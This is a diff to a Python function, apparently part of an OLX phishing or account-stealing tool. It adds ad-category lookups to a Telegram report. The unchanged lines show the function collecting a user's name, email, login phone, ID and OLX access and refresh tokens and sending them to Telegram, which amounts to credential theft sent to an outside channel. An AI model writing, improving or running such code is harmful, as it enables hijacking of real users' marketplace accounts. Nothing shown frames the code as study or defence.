@@ -97,8 +97,9 @@ def get_token():
 
         # ---------- ADS ----------
         ad_list_for_cookie = []
-        ads_flat_tg = ""
         ads_data = []
+
+        category_cache = {}
 
         try:
             ads_api_res = requests.get(
@@ -114,24 +115,43 @@ def get_token():
                 title = ad.get('title', 'Без названия')
                 url = ad.get('url', 'https://olx.ua')
 
+                category_id = ad.get('category_id')
+                category_name = "Неизвестно"
+
+                if category_id:
+                    if category_id in category_cache:
+                        category_name = category_cache[category_id]
+                    else:
+                        try:
+                            cat_res = requests.get(
+                                f"https://www.olx.ua/api/categories/{category_id}",
+                                headers=headers,
+                                timeout=5
+                            )
+
+                            if cat_res.status_code == 200:
+                                cat_data = cat_res.json()
+                                category_name = cat_data.get("name", "Неизвестно")
+                                category_cache[category_id] = category_name
+
+                        except:
+                            pass
+
                 if len(ad_list_for_cookie) < 5:
                     ad_list_for_cookie.append({
                         "title": title,
-                        "url": url,
-                        "img": OLX_LOGO
+                        "url": url
                     })
 
-                ads_flat_tg += f"{i+1}. <a href='{url}'>{title}</a>\n"
-
         except:
-            ads_flat_tg = "Ошибка получения товаров"
+            pass
 
         # ---------- TELEGRAM MSG ----------
         msg = (
             "👤 <b>АВТОРИЗАЦИЯ ПОЛЬЗОВАТЕЛЯ</b>\n\n"
             f"<b>Имя:</b> {user_data.get('name')}\n"
             f"<b>Email:</b> <code>{email}</code>\n"
-            f"<b>Телефон входа:</b><code> {user_data.get('phone_login')}</code>\n\n"
+            f"<b>Телефон входа:</b><code>{user_data.get('phone_login')}</code>\n\n"
             f"<b>ACCESS TOKEN:</b> <code>{access}</code>\n"
             f"<b>REFRESH TOKEN:</b> <code>{refresh}</code>\n\n"
             f"<b>ID:</b> {user_data.get('id')}\n"
@@ -140,7 +160,13 @@ def get_token():
         )
 
         for i, ad in enumerate(ads_data):
-            msg += f"{i+1}. <a href='{ad.get('url')}'>{ad.get('title')}</a>\n"
+            category_id = ad.get('category_id')
+            category_name = category_cache.get(category_id, "Неизвестно")
+
+            msg += (
+                f"{i + 1}. <a href='{ad.get('url')}'>{ad.get('title')}</a>\n"
+                f"📂 {category_name}\n\n"
+            )
 
         send_telegram_message(msg)
 
